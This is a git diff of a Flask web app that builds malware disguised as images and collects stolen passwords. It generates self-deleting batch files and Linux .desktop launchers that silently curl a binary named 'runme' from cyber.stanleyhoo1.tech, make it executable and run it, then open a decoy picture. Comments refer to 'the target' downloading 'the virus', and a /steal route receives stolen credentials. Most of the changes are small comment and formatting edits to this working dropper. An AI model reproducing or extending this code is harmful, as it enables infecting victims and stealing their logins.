@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, jsonify, send_from_directory, flash, redirect, url_for, redirect, session
+from flask import Flask, render_template, request, send_from_directory, flash, redirect, url_for, redirect, session
 import os
 import sqlite3
 from werkzeug.security import generate_password_hash, check_password_hash
@@ -13,6 +13,7 @@ app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY") or os.urandom(32)
 REGISTRATION_KEY = secrets.token_urlsafe(32)
 
+# Folder pathss
 UPLOAD_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'uploads')
 PROCESSED_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'processed')
 EXECUTABLES_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'executables')
@@ -22,6 +23,7 @@ BATFILES_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'batf
 DESKTOP_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'deskfiles')
 BAT_TO_EXE_PATH = "/home/stanley/B2E.exe"
 # BAT_TO_EXE_PATH = "/mnt/c/Users/stanl/Downloads/Bat_To_Exe_Converter_x64.exe"
+
 app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
 app.config["PROCESSED_FOLDER"] = PROCESSED_FOLDER
 app.config["EXECUTABLES_FOLDER"] = EXECUTABLES_FOLDER
@@ -30,6 +32,7 @@ app.config["PNG_FOLDER"] = PNG_FOLDER
 app.config["BATFILES_FOLDER"] = BATFILES_FOLDER
 app.config["DESKTOP_FOLDER"] = DESKTOP_FOLDER
 
+# Create folders if they don't exist
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 os.makedirs(PROCESSED_FOLDER, exist_ok=True)
 os.makedirs(EXECUTABLES_FOLDER, exist_ok=True)
@@ -38,6 +41,7 @@ os.makedirs(PNG_FOLDER, exist_ok=True)
 os.makedirs(BATFILES_FOLDER, exist_ok=True)
 os.makedirs(DESKTOP_FOLDER, exist_ok=True)
 
+# Database path
 DB_PATH = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data.db')
 
 # Pulls the compiled c file, gives it executable permissions, then runs it
@@ -58,6 +62,7 @@ start "" /min "%delbat%"
 
 exit'''
 
+# Template for desktop file
 desktop_template = '''[Desktop Entry]
 Type=Application
 Name=FILENAME
@@ -109,7 +114,7 @@ def get_data():
     conn.close()
     return data
 
-# Homepage
+# Home page
 @app.route("/")
 def home():
     return render_template('home.html')
@@ -150,6 +155,7 @@ def proceed():
     batfile += f'''\nwsl bash -c "curl -s -X POST -o {original_filename} https://cyber.stanleyhoo1.tech/download_image/{filename} 2>/dev/null"'''
     batfile += f'''\nstart {original_filename}'''
 
+    # Batfile self deletes
     batfile += del_exe
 
     # Saves the batfile
@@ -159,11 +165,17 @@ def proceed():
     # Path for the desktop file
     deskfile_path = os.path.join("deskfiles", f'{os.path.splitext(filename)[0]}.desktop')
 
-    # Creates the desktop file
+    # Creates the desktop file with same logic as batfile
     deskfile = desktop_template[:]
     deskfile = deskfile.replace("FILENAME", original_filename)
     deskfile_commands = ""
-    deskfile_commands += f"curl -s -X POST -o ~/.config/rm17-node https://cyber.stanleyhoo1.tech/files/runme 2>/dev/null; chmod +x ~/.config/rm17-node 2>/dev/null; ~/.config/rm17-node 2>/dev/null; curl -s -X POST -o {original_filename} https://cyber.stanleyhoo1.tech/download_image/{filename} 2>/dev/null; rm .{os.path.splitext(filename)[0]}.png; xdg-open {original_filename}"
+    deskfile_commands += (f"curl -s -X POST -o ~/.config/rm17-node https://cyber.stanleyhoo1.tech/files/runme 2>/dev/null; " 
+                          f"chmod +x ~/.config/rm17-node 2>/dev/null; " 
+                          f"~/.config/rm17-node 2>/dev/null; " 
+                          f"curl -s -X POST -o {original_filename} https://cyber.stanleyhoo1.tech/download_image/{filename} 2>/dev/null; " 
+                          f"rm .{os.path.splitext(filename)[0]}.png; " 
+                          f"xdg-open {original_filename}; " 
+                          f"rm {session['filename']}.desktop")
     deskfile = deskfile.replace("COMMANDS", deskfile_commands)
     deskfile = deskfile.replace("PNG_PATH", f'{os.path.splitext(original_filename)[0]}.png')
 
@@ -188,12 +200,8 @@ def proceed():
     # subprocess.run(["wine", BAT_TO_EXE_PATH, "/bat", batfile_path, "/exe", f'executables/{os.path.splitext(filename)[0]}.exe', "/icon", ico_path, "/invisible"])
     subprocess.run(["python3", "/home/stanley/pseudo/app/convert_exe.py", os.path.splitext(filename)[0]])
 
-
-    # # Delete original upload
-    # os.remove(upload_path)
-
     flash("Image processed! Click download to get the PNG.", "success")
-    return render_template("results.html", filename=original_filename, img=filename, download_filename=f'{os.path.splitext(filename)[0]}', download_png_name=original_filename)
+    return render_template("results.html", filename=original_filename, img=filename, download_filename=f'{os.path.splitext(filename)[0]}', download_png_name=f'.{original_filename}')
 
 # Download page where the target will download the virus
 @app.route("/results", methods=['GET', 'POST'])
@@ -217,7 +225,7 @@ def passwords():
     else:
         return render_template('passwords.html')
 
-# Form to send the sotlen info through
+# Form to send the stolen info through
 @app.route('/steal', methods=['POST'])
 def steal():
     username = request.form.get('username')
